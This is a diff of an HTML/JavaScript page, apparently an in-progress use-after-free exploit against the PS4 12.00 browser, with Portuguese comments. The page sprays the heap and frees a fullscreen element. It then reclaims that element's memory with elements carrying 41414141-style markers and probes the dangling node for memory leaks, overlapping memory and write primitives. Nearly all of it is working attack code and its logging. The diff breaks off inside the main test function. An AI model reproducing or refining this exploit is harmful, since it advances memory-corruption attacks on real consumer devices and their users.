@@ -1,16 +1,20 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Conversion FINAL</title>
+<title>PS4 12.00 - UAF Stage: Leak + Overlap</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Conversion - Real Type Confusion</h2>
+<h2>PS4 12.00 - UAF Leak Stage</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
+// ==========================
+// 🔒 LOG SEGURO
+// ==========================
 let logBuffer = [];
 function log(msg){
     try{console.log(msg);}catch(e){}
@@ -18,16 +22,20 @@ function log(msg){
 }
 
 // ==========================
+// HEAP SETUP
+// ==========================
 function setupHeap(){
-    let arrs=[];
+    let arr=[];
     for(let i=0;i<5000;i++){
-        let a=new Float64Array(8);
-        a[0]=i;
-        arrs.push(a);
+        let t=new Float64Array(8);
+        t[0]=i;
+        arr.push(t);
     }
-    return arrs;
+    return arr;
 }
 
+// ==========================
+// FULLSCREEN
 // ==========================
 function setupFullscreen(){
     let fsTarget=document.createElement("div");
@@ -51,6 +59,8 @@ function setupFullscreen(){
 }
 
 // ==========================
+// 🔥 RECLAIM CONTROLADO + MARKERS
+// ==========================
 function preciseReclaim(size){
     log("[*] Reclaim size = "+size);
 
@@ -67,38 +77,37 @@ function preciseReclaim(size){
 
         let el;
 
-        // 🔥 alterna tipos (ESSENCIAL)
-        if(i % 4 === 0){
-            el = document.createElement("div");
-            el.innerHTML = "CTRL_"+i+"_41414141";
+        // 90% controlado (mantém slot)
+        if(i % 10 !== 0){
 
-        } else if(i % 4 === 1){
-            el = document.createElement("svg"); // 🔥 tipo diferente
-            el.innerHTML = "<circle cx='50' cy='50' r='40'></circle>";
+            el=document.createElement("div");
 
-        } else if(i % 4 === 2){
-            el = document.createTextNode("TXT_"+i+"_BBBBBBBB"); // 🔥 TextNode direto
+            el.innerHTML=
+                "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+
+                "_41414141_42424242_43434343<br>Press OPTIONS</h1>";
 
-            document.body.appendChild(el);
-            bucket.push(el);
-            continue;
-
-        } else {
-            el = document.createElement("div");
-            el.innerHTML = "<img src=x onerror=console.log('X')>";
+        }
+        // 10% variação leve
+        else{
+            if(i % 20 === 0){
+                el=document.createElement("svg");
+                el.innerHTML="<circle cx='50' cy='50' r='40'></circle>";
+            }else{
+                el=document.createTextNode("TXT_"+i+"_BBBB");
+                document.body.appendChild(el);
+                bucket.push(el);
+                continue;
+            }
         }
 
-        // estilo pesado (mantém reuse visual)
-        if(el.style){
-            Object.assign(el.style,{
-                background:"black",
-                width:"100%",
-                height:"100%",
-                position:"absolute",
-                top:"0",
-                left:"0"
-            });
-        }
+        Object.assign(el.style,{
+            background:"black",
+            width:"100%",
+            height:"100%",
+            position:"absolute",
+            top:"0",
+            left:"0"
+        });
 
         document.body.appendChild(el);
         bucket.push(el);
@@ -108,94 +117,118 @@ function preciseReclaim(size){
 }
 
 // ==========================
+// 🔬 LEAK + OVERLAP SCAN
+// ==========================
 function deepProbe(fsTarget){
+
     log("---- DEEP PROBE ----");
 
+    let html="";
+
     try{
-        let html=fsTarget.innerHTML;
+        html=fsTarget.innerHTML;
         log("[CHECK] innerHTML = "+html);
-    }catch(e){
-        log("[CRASH] innerHTML");
-    }
 
-    // 🔥 leitura via child
-    try{
-        let child=fsTarget.firstChild;
-
-        log("[CHECK] child = "+child);
-
-        if(child){
-            log("[CHECK] childType = "+child.nodeType);
-
-            try{
-                log("[LEAK?] textContent = "+child.textContent);
-            }catch(e){
-                log("[CRASH] textContent");
-            }
-
-            try{
-                log("[LEAK?] nodeValue = "+child.nodeValue);
-            }catch(e){
-                log("[CRASH] nodeValue");
-            }
-
-            try{
-                // tentativa de confusão
-                child.innerHTML="X";
-                log("[PWN] innerHTML write OK");
-            }catch(e){
-                log("[TYPE CONFUSION] write crash");
-            }
+        // 🔥 DETECÇÃO DE CONTROLE
+        if(html.includes("CTRL_")){
+            log("[!!!] REUSE CONTROLADO CONFIRMADO");
         }
 
     }catch(e){
-        log("[CRASH] firstChild");
+        log("[UAF] innerHTML crash");
     }
 
-    // 🔥 layout vs JS mismatch
+    // 🔥 LEAK SCAN
     try{
-        let rect=fsTarget.getBoundingClientRect();
-        log("[CHECK] rect = "+rect.width);
+
+        let txt=fsTarget.textContent || "";
+
+        log("[LEAK] len = "+txt.length);
+
+        let preview=txt.substring(0,120);
+        log("[LEAK] preview = "+preview);
+
+        // markers
+        if(txt.includes("41414141") ||
+           txt.includes("42424242") ||
+           txt.includes("43434343")){
+            log("[!!!] POSSIVEL LEAK REAL (MARKER)");
+        }
+
+        // 🔥 OVERLAP DETECTION
+        let weird=false;
+
+        for(let i=0;i<txt.length;i++){
+            let c=txt.charCodeAt(i);
+
+            // ASCII fora do esperado
+            if(c < 32 || c > 126){
+                weird=true;
+                break;
+            }
+        }
+
+        if(weird){
+            log("[!!!] POSSIVEL OVERLAP / MEMORIA ESTRANHA");
+        }else{
+            log("[SCAN] ASCII normal");
+        }
+
+    }catch(e){
+        log("[LEAK] crash leitura");
+    }
+
+    // estabilidade
+    try{
+        log("[CHECK] parent = "+fsTarget.parentNode);
+    }catch(e){}
+
+    try{
+        let r=fsTarget.getBoundingClientRect();
+        log("[CHECK] rect = "+r.height);
     }catch(e){
         log("[UAF] rect crash");
     }
 
     try{
-        let h=fsTarget.offsetHeight;
-        log("[CHECK] layout = "+h);
+        fsTarget.innerHTML="A";
+        log("[PWN] write OK");
     }catch(e){
-        log("[UAF] layout crash");
-    }
-
-    try{
-        let p=fsTarget.parentNode;
-        log("[CHECK] parent = "+p);
-    }catch(e){
-        log("[CRASH] parent");
+        log("[PWN] write crash");
     }
 }
 
 // ==========================
+// TRIGGER
+// ==========================
 function trigger(fsTarget){
+
     log("[*] Trigger");
 
     try{
         fsTarget.remove();
 
-        document.webkitExitFullscreen?.();
+        if(document.webkitIsFullScreen || document.fullscreenElement){
+            document.webkitExitFullscreen?.();
+        }
 
-    }catch(e){}
+    }catch(e){
+        log("[ERRO]");
+    }
 
-    let sizes=[2000,2500,3000];
+    let sizes=[1800,2000,2200,2500];
 
     sizes.forEach((s,i)=>{
-        setTimeout(()=>preciseReclaim(s),i*50);
+        setTimeout(()=>preciseReclaim(s),i*60);
     });
 
+    // probes
     setTimeout(()=>deepProbe(fsTarget),20);
     setTimeout(()=>deepProbe(fsTarget),80);
-    setTimeout(()=>deepProbe(fsTarget),150);
+    setTimeout(()=>deepProbe(fsTarget),140);
+    setTimeout(()=>deepProbe(fsTarget),220);
 
+    // dump
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     },400);
@@ -204,10 +237,14 @@ function trigger(fsTarget){
 }
 
 // ==========================
+// MAIN
+// ==========================
 function runTest(){
+
     log("[*] Iniciando teste");
 
     setupHeap();
+
     let fsTarget=setupFullscreen();
 
     window.onblur=function(){
